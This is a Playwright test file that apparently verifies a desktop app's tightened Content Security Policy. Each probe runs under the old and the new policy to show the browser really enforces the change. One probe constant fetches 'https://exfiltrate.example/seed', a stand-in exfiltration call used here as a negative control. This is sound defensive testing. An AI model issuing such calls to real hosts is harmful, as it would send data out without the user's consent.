import { readFileSync } from "node:fs";
import { expect, test, type BrowserContext } from "@playwright/test";

/**
 * Proof that the packaged policy is a real containment layer, not a string in
 * a config file.
 *
 * `scripts/csp-policy.node-test.mjs` proves the shipped CSP *says* what #904
 * phase 4 decided it should say. This file proves a browser *enforces* it:
 * each retired capability is exercised twice — once under the policy ZUULI
 * shipped before this change, where the load completes, and once under the
 * policy it ships now, where the engine raises `securitypolicyviolation` and
 * the load fails.
 *
 * The old policy is the positive control. Without it a "blocked" result would
 * prove only that the probe failed, which a typo would also produce.
 *
 * What is measured is the renderer's verdict — `securitypolicyviolation` plus
 * the probe's own success flag — and deliberately **not** whether a request
 * reached the network. Playwright's `page.route` interception is consulted
 * before the renderer's CSP check, so a request event fires for a blocked load
 * too; asserting on it would be a measurement taken where the difference
 * cannot appear.
 */

const tauriConfig = JSON.parse(
  readFileSync(new URL("../src-tauri/tauri.conf.json", import.meta.url), "utf8"),
) as { app?: { security?: { csp?: unknown } } };
const shippedCsp = tauriConfig.app?.security?.csp;

/** The policy ZUULI shipped before #904 phase 4, verbatim. */
const PREVIOUS_CSP =
  "default-src 'self'; img-src 'self' data: blob: https:; media-src 'self' https:; " +
  "frame-src 'none'; connect-src 'self' https://free2z.cash https://*.free2z.cash " +
  "https://free2z.com https://*.free2z.com https://*.zec.rocks https://*.dyte.io " +
  "wss://*.dyte.io https://api.realtime.cloudflare.com " +
  "https://api-silos.realtime.cloudflare.com https://da-collector.realtime.cloudflare.com " +
  "https://location.realtime.cloudflare.com https://location-legacy.realtime.cloudflare.com " +
  "https://r2.cloudflarestorage.com https://rtk-assets.realtime.cloudflare.com " +
  "wss://socket-edge.realtime.cloudflare.com https://*.stripe.com " +
  "https://checkout.stripe.com; style-src 'self' 'unsafe-inline'; " +
  "script-src 'self' 'wasm-unsafe-eval'";

const ONE_PIXEL_PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=",
  "base64",
);

interface ProbeResult {
  /** Directives the engine reported a violation for, in order. */
  violations: string[];
  /** Whether the probe's own load/fetch reported success in page script. */
  succeeded: boolean;
}

/**
 * Load a blank same-origin document that declares `csp` in a meta tag, then
 * run one probe inside it. A meta-tag policy is enforced by the same engine
 * path as the header Tauri sets on its custom protocol, so a violation here is
 * the violation the packaged app produces.
 */
async function probe(
  context: BrowserContext,
  csp: string,
  body: string,
): Promise<ProbeResult> {
  // A fresh page per probe: route handlers and listeners are page-scoped, and
  // reusing one page lets probe N observe probe N-1's traffic.
  const page = await context.newPage();
  await page.route("**/*", async (route) => {
    const url = new URL(route.request().url());
    const synthetic =
      url.hostname.endsWith(".example") ||
      url.hostname.endsWith(".cloudflare.com");
    if (!synthetic) {
      await route.continue();
      return;
    }
    await route.fulfill({
      status: 200,
      contentType: url.pathname.endsWith(".png") ? "image/png" : "text/plain",
      headers: { "access-control-allow-origin": "*" },
      body: url.pathname.endsWith(".png") ? ONE_PIXEL_PNG : "ok",
    });
  });

  await page.goto("/");
  await page.setContent(
    `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${csp}"></head><body></body></html>`,
  );

  const result = await page.evaluate(async (probeBody) => {
    const violations: string[] = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      violations.push(event.violatedDirective);
    });
    let succeeded = false;
    try {
      succeeded = await new Function(`return (${probeBody})()`)();
    } catch {
      succeeded = false;
    }
    // Violation events are queued as tasks; let them drain before reporting.
    await new Promise((resolve) => setTimeout(resolve, 250));
    return { violations, succeeded };
  }, body);

  await page.close();
  return result;
}

const LOAD_REMOTE_IMAGE = `async () => {
  const image = new Image();
  const settled = new Promise((resolve) => {
    image.onload = () => resolve(true);
    image.onerror = () => resolve(false);
  });
  image.src = "https://tracker.example/pixel.png";
  document.body.append(image);
  return settled;
}`;

const CONNECT_TO_REALTIMEKIT = `async () => {
  const response = await fetch(
    "https://api.realtime.cloudflare.com/v2/internals/participant-details",
  );
  return response.ok;
}`;

const CONNECT_TO_ARBITRARY_HOST = `async () => {
  const response = await fetch("https://exfiltrate.example/seed");
  return response.ok;
}`;

test("the shipped CSP is the one this file measures", () => {
  expect(typeof shippedCsp).toBe("string");
  expect(shippedCsp).not.toBe(PREVIOUS_CSP);
});

test("the previous policy loaded a remote image; the shipped one blocks it", async ({
  context,
}) => {
  const before = await probe(context, PREVIOUS_CSP, LOAD_REMOTE_IMAGE);
  expect(before.succeeded).toBe(true);
  expect(before.violations).toEqual([]);

  const after = await probe(context, shippedCsp as string, LOAD_REMOTE_IMAGE);
  expect(after.succeeded).toBe(false);
  expect(after.violations).toContain("img-src");
});

test("the previous policy reached RealtimeKit; the shipped one blocks it", async ({
  context,
}) => {
  const before = await probe(context, PREVIOUS_CSP, CONNECT_TO_REALTIMEKIT);
  expect(before.succeeded).toBe(true);
  expect(before.violations).toEqual([]);

  const after = await probe(context, shippedCsp as string, CONNECT_TO_REALTIMEKIT);
  expect(after.succeeded).toBe(false);
  expect(after.violations).toContain("connect-src");
});

test("both policies refuse an arbitrary host, so the probe is not trivially true", async ({
  context,
}) => {
  // The negative control for the two tests above: `connect-src` was never a
  // blanket allow, so a probe that "passed" only by reaching a host neither
  // policy admits would prove nothing about what actually changed.
  const before = await probe(context, PREVIOUS_CSP, CONNECT_TO_ARBITRARY_HOST);
  expect(before.succeeded).toBe(false);
  expect(before.violations).toContain("connect-src");

  const after = await probe(context, shippedCsp as string, CONNECT_TO_ARBITRARY_HOST);
  expect(after.succeeded).toBe(false);
  expect(after.violations).toContain("connect-src");
});
